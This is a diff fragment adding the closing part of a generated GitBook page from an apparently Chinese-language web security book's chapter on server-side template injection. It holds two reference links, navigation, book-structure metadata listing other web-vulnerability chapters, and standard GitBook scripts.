+<li><a href="https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9" target="_blank">Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018</a></li>
+<li><a href="https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf" target="_blank">EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../[XML实体注入漏洞-XXE" class="navigation navigation-prev navigation-unique" aria-label="Previous page: XML实体注入漏洞-XXE">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"模板注入-SSTI","level":"2.1.9","depth":2,"next":{"title":"前端安全","level":"2.2","depth":1,"ref":"","articles":[{"title":"跨站脚本攻击-XSS","level":"2.2.1","depth":2,"path":"跨站脚本攻击-XSS/README.md","ref":"跨站脚本攻击-XSS/README.md","articles":[]},{"title":"跨站请求伪造-CSRF","level":"2.2.2","depth":2,"path":"跨站请求伪造-CSRF/README.md","ref":"跨站请求伪造-CSRF/README.md","articles":[]},{"title":"CORS配置错误","level":"2.2.3","depth":2,"path":"CORS配置错误/README.md","ref":"CORS配置错误/README.md","articles":[]},{"title":"Web缓存泄露","level":"2.2.4","depth":2,"path":"Web缓存泄露/README.md","ref":"Web缓存泄露/README.md","articles":[]}]},"previous":{"title":"XML实体注入漏洞-XXE","level":"2.1.8","depth":2,"path":"[XML实体注入漏洞-XXE","ref":"[XML实体注入漏洞-XXE","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"模板注入-SSTI/README.md","mtime":"2019-09-15T21:20:20.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-09-16T07:03:19.203Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
